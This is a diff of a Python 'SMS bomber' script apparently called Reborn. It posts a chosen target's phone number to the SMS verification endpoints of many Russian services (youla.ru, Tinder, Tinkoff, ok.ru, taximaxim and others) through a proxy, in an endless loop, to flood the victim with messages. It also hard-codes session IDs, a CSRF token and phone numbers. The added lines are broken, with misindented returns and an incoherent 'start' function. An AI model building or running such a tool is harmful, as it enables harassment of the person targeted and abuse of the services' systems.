@@ -16,7 +16,7 @@ proxies = {
     'http': '91.225.104.182:80'
 }
 
-print(Fore.GREEN'''
+print(Fore.GREEN + Back.BLACK + Style.BRIGHT + '''
  ______   _______  _______  _______  _______  _______ 
 (  __  \ (  ____ \(       )(  ___  )/ ___   )(  ___  )
 | (  \  )| (    \/| () () || (   ) |\/   )  || (   ) |
@@ -26,7 +26,6 @@ print(Fore.GREEN'''
 | (__/  )| (____/\| )   ( || (___) | /   (_/\| )   ( |
 (______/ (_______/|/     \|(_______)(_______/|/     \|                                              
 ''' + Style.RESET_ALL)
-
 print('\tChecking For Updates...')
 ver = urllib.request.urlopen(
     "https://raw.githubusercontent.com/demoza/Reborn/master/.version").read().decode('utf-8')
@@ -49,70 +48,86 @@ try:
         print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
 except Exception:
     pass
-    
 
-a = input('Select target Number :')
+a = input('Select target:')
 b = 999
+def start(target, counter, delay, ch, cc):
+    clr()
+    banner()
+    failed = 0
+    requested = 0
+    success = int(requested) - int(failed)
+    bombs = int(counter) + 1
 class services():
 	# service number 1
 	def service1(self, a, proxies):
 		r = requests.post('https://youla.ru/web-api/auth/request_code',
 			data = {"phone":a}, proxies=proxies)
-		print('youla.ru ' + str(r.status_code))
+		print('youla.ru ' + str(requested))
+         return True
 
 	# service number 2
 	def service2(self, a, proxies):
 		r = requests.post('https://api.sunlight.net/v3/customers/authorization/',
 			data = {"phone":a}, proxies=proxies)
 		print('sunlight.net ' + str(r.status_code))
+         return True
 
 	# service number 3
 	def service3(self, a, proxies):
 		r = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
 			data = {"phone_number":a}, proxies=proxies)
 		print('tinder.com ' + str(r.status_code))
+         return True
 
 	# service number 4
 	def service4(self, a, proxies):
 		r = requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1',
 			data = {"phone":a}, proxies=proxies)
 		print('tinkoff.ru ' + str(r.status_code))
+         return True
 
 	# service number 5
 	def service5(self, a, proxies):
 		r = requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',
 			data = {"phone":a,"oper":"9"})
 		print('sipnet.ru ' + str(r.status_code))
+         return True
 
 	# service number 7
 	def service7(self, a, proxies):
 		r = requests.post('https://rutube.ru/api/accounts/sendpass/phone?phone=%2B79195346628',
 			data = {"phone":a}, proxies=proxies)
 		print('rutube.ru ' + str(r.status_code))
+         return True
 
 	# service number 8
 	def service8(self, a, proxies):
 		r = requests.post('https://client.taximaxim.com/site/send-code/?type=0',
 			data = {"_csrf":"SuyaDpUnfWWvTkF8GytL1zAJqUUvLMc_SUXaEGhXsoQa2tJvwF8nC_YJEQpaHhKkVGCRIhljrggQJ4ljCW-G4Q==","LoginForm[org]":"maxim","LoginForm[country]":"ru","LoginForm[baseId]":"11","LoginForm[phone]":a,"LoginForm[code]":"","LoginForm[agree]":"0"}, proxies=proxies)
 		print('taximaxim.com ' + str(r.status_code))
+         return True
 
 	# service number 9
 	def service9(self, a, proxies):
 		r = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
 			data={"st.r.phone": a}, proxies=proxies)
 		print('ok.ru ' + str(r.status_code))
+         return True
 
 	# service number 10	
 	def service10(self, a, proxies):
 		r = requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
 			data={"phone": a}, proxies=proxies)
 		print('prime.anytime.global ' + str(r.status_code))
+         return True
 
 	# service number 11
 	def service11(self, a, proxies):
 		r = requests.post('https://belkacar.ru/get-confirmation-code',
 			data = {"phone": a}, proxies=proxies)
 		print('belkacar.ru ' + str(r.status_code))
+         return True
 
 	# service number 12
 	def service12(self, a, proxies):
@@ -263,6 +278,8 @@ while 1:
 	services().service4(a,proxies)
 	sleep(b)
 	services().service5(a,proxies)
+	sleep(b)
+	services().service6(a,proxies)
 	sleep(b)
 	services().service7(a,proxies)
 	sleep(b)
